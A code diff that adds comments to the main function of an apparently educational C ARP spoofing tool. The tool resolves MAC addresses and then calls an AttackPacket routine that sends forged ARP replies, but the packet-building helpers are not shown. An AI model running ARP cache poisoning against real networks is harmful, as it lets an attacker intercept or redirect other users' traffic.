@@ -12,6 +12,7 @@ int main(int argc, char** argv){
         printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
         return -1;
     }
+    /* check arguments are IP format */
     if(inet_pton(AF_INET, argv[2], &SenderIP) != 1){
         printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
         return -1;
@@ -45,6 +46,7 @@ int main(int argc, char** argv){
     printf("**********************************\n");
     printf("Get Local Mac Address...\n");
 
+    /* Get Local Mac Address */
     if(GetMyMac(&MyMac, dev) != 1){
         fprintf(stderr, "Couldn't Get local Mac Address\n");
         return 2;
@@ -56,6 +58,7 @@ int main(int argc, char** argv){
     printf("**********************************\n");
     printf("Get Sender Mac Address...\n");
 
+    /* Get Sender Mac Address */
     if(GetSenderMac(handle, MyMac, MyIP, SenderIP, &SenderMac) != 1){
         fprintf(stderr, "Couldn't Get Sender Mac Address\n");
         return 2;
@@ -66,6 +69,7 @@ int main(int argc, char** argv){
     printf("Attack Start\n");
     printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&MyMac));
 
+    /* Generate Fake Arp Reply Packet and send */
     if(AttackPacket(handle,SenderMac,MyMac,TargetIP,SenderIP) != 1){
         fprintf(stderr, "Couldn't Attack\n");
         return 2;
